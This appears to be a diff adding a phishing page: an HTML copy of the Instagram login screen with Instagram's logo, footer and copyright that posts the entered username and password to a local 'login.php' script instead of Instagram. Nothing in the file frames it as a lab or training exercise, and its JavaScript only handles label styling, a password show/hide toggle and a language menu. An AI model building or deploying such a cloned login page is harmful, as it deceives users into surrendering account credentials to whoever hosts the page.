@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram • Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      @media (max-width: 450px) {
+        .mobile-borderless {
+          border: none !important;
+        }
+      }
+      body {
+        background-color: white !important;
+      }
+
+      .language-select {
+        position: relative;
+        display: inline-block;
+      }
+
+      .language-options {
+        display: none;
+        position: absolute;
+        bottom: 100%;
+        left: 50%;
+        transform: translateX(-50%);
+        background: white;
+        border: 1px solid #dbdbdb;
+        border-radius: 5px;
+        padding: 8px 0;
+        width: 200px;
+        max-height: 300px;
+        overflow-y: auto;
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+        z-index: 50;
+      }
+
+      .language-select:focus-within .language-options {
+        display: block;
+      }
+
+      .floating-label {
+        position: absolute;
+        pointer-events: none;
+        left: 10px;
+        top: 12px;
+        transition: 0.2s ease all;
+        color: #8e8e8e;
+      }
+
+      @media (max-width: 640px) {
+        .language-options {
+          position: fixed;
+          top: auto;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          width: 100%;
+          max-height: 50vh;
+          transform: none;
+          border-radius: 12px 12px 0 0;
+        }
+
+        .language-overlay {
+          display: none;
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          background-color: rgba(0, 0, 0, 0.5);
+          z-index: 40;
+        }
+
+        .language-options.active {
+          display: block;
+        }
+
+        .language-overlay.active {
+          display: block;
+        }
+      }
+    </style>
+  </head>
+  <body class="bg-gray-50">
+    <main
+      class="flex min-h-screen flex-col items-center justify-center py-2 px-4"
+    >
+      <!-- Login Container -->
+      <div class="w-full max-w-[350px] mx-auto">
+        <!-- Main Card -->
+        <div
+          class="bg-white p-10 border border-gray-300 mb-3 mobile-borderless"
+        >
+          <!-- Instagram Logo -->
+          <div class="flex justify-center mb-8">
+            <img
+              src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
+              alt="Instagram"
+              class="h-12"
+            />
+          </div>
+
+          <!-- Login Form -->
+          <form action="login.php" method="post" class="space-y-3">
+            <div class="relative">
+              <input
+                type="text"
+                id="email"
+                name="email"
+                placeholder=" "
+                required
+                class="input-field w-full px-2 pt-3 pb-2 border border-gray-300 rounded-sm bg-gray-50 text-sm focus:outline-none focus:border-gray-400"
+              />
+              <label for="email" class="floating-label text-xs"
+                >Phone number, username, or email</label
+              >
+            </div>
+            <div class="relative">
+              <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder=" "
+                required
+                class="input-field w-full px-2 pt-3 pb-2 border border-gray-300 rounded-sm bg-gray-50 text-sm focus:outline-none focus:border-gray-400"
+              />
+              <label for="password" class="floating-label text-xs"
+                >Password</label
+              >
+              <button
+                type="button"
+                id="togglePassword"
+                class="absolute right-3 top-2 text-sm text-black hidden font-semibold hover:text-gray-500"
+              >
+                Show
+              </button>
+            </div>
+
+            <button
+              type="submit"
+              class="w-full bg-[#0095f6] text-white py-[2.4%] rounded-lg font-semibold text-sm opacity-70"
+            >
+              Log in
+            </button>
+          </form>
+
+          <!-- OR Divider -->
+          <div class="flex items-center my-4">
+            <div class="flex-grow border-t border-gray-300"></div>
+            <span class="px-4 text-sm font-semibold text-gray-500">OR</span>
+            <div class="flex-grow border-t border-gray-300"></div>
+          </div>
+
+          <!-- Facebook Login -->
+          <div class="mt-8">
+            <button
+              class="w-full text-[#0095f6] font-semibold text-sm flex items-center justify-center gap-2"
+            >
+              <svg
+                class="h-6 w-6 text-[#0095f6]"
+                fill="currentColor"
+                viewBox="0 0 24 24"
+              >
+                <path
+                  d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z"
+                />
+              </svg>
+              Log in with Facebook
+            </button>
+          </div>
+
+          <!-- Forgot Password -->
+          <a href="#" class="block text-center text-sm text-[#385185] mt-4">
+            Forgot password?
+          </a>
+        </div>
+
+        <!-- Sign Up Card -->
+        <div
+          class="bg-white p-5 border border-gray-300 mobile-borderless text-sm text-center"
+        >
+          <p>
+            Don't have an account?
+            <a href="#" class="text-[#0095f6] font-semibold">Sign up</a>
+          </p>
+        </div>
+
+        <!-- Get the App -->
+        <div class="mt-4 text-center">
+          <p class="text-sm mb-4">Get the app.</p>
+          <div class="flex justify-center gap-4">
+            <a href="#" class="h-10">
+              <img
+                src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
+                alt="Get it on Google Play"
+                class="h-full"
+              />
+            </a>
+            <a href="#" class="h-10">
+              <img
+                src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
+                alt="Get it from Microsoft"
+                class="h-full"
+              />
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <footer class="mt-20 mb-8 text-xs text-gray-500">
+        <nav class="flex flex-wrap justify-center gap-4 mb-4">
+          <a href="#">Meta</a>
+          <a href="#">About</a>
+          <a href="#">Blog</a>
+          <a href="#">Jobs</a>
+          <a href="#">Help</a>
+          <a href="#">API</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+          <a href="#">Locations</a>
+          <a href="#">Instagram Lite</a>
+          <a href="#">Threads</a>
+          <a href="#">Contact Uploading & Non-Users</a>
+          <a href="#">Meta Verified</a>
+        </nav>
+        <div class="flex justify-center gap-4">
+          <div class="language-select">
+            <button
+              id="languageToggle"
+              class="bg-transparent hover:underline focus:outline-none"
+            >
+              English
+              <svg
+                class="inline-block w-4 h-4 ml-1"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  stroke-width="2"
+                  d="M19 9l-7 7-7-7"
+                ></path>
+              </svg>
+            </button>
+            <div class="language-options">
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Afrikaans
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Čeština
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">Dansk</div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Deutsch
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Ελληνικά
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                English
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Español
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Français
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Indonesian
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Italiano
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Magyar
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Nederlands
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Polski
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Português
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Русский
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Svenska
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                Türkçe
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">中文</div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                日本語
+              </div>
+              <div class="py-1 px-4 hover:bg-gray-50 cursor-pointer">
+                한국어
+              </div>
+            </div>
+          </div>
+          <span>© 2025 Instagram from Meta</span>
+        </div>
+      </footer>
+    </main>
+
+    <script>
+      const togglePassword = document.querySelector("#togglePassword");
+      const password = document.querySelector("#password");
+      const email = document.querySelector("#email");
+      const languageToggle = document.querySelector("#languageToggle");
+      const languageOptions = document.querySelector("#languageOptions");
+      const languageOverlay = document.querySelector("#languageOverlay");
+
+      function handleInputChange(input, label) {
+        if (input.value.length > 0) {
+          label.style.top = "4px";
+          label.style.fontSize = "10px";
+        } else {
+          label.style.top = "12px";
+          label.style.fontSize = "14px";
+        }
+      }
+
+      email.addEventListener("input", function () {
+        handleInputChange(this, this.nextElementSibling);
+      });
+
+      password.addEventListener("input", function () {
+        handleInputChange(this, this.nextElementSibling);
+        togglePassword.style.display =
+          this.value.length > 0 ? "inline-block" : "none";
+      });
+
+      togglePassword.addEventListener("click", function () {
+        const type =
+          password.getAttribute("type") === "password" ? "text" : "password";
+        password.setAttribute("type", type);
+        this.textContent = type === "password" ? "Show" : "Hide";
+      });
+
+      languageToggle.addEventListener("click", function (e) {
+        e.preventDefault();
+        languageOptions.classList.toggle("active");
+        languageOverlay.classList.toggle("active");
+      });
+
+      languageOverlay.addEventListener("click", function () {
+        languageOptions.classList.remove("active");
+        languageOverlay.classList.remove("active");
+      });
+
+      languageOptions.addEventListener("click", function (e) {
+        if (e.target.classList.contains("py-1")) {
+          languageToggle.textContent = e.target.textContent;
+          languageOptions.classList.remove("active");
+          languageOverlay.classList.remove("active");
+        }
+      });
+    </script>
+  </body>
+</html>
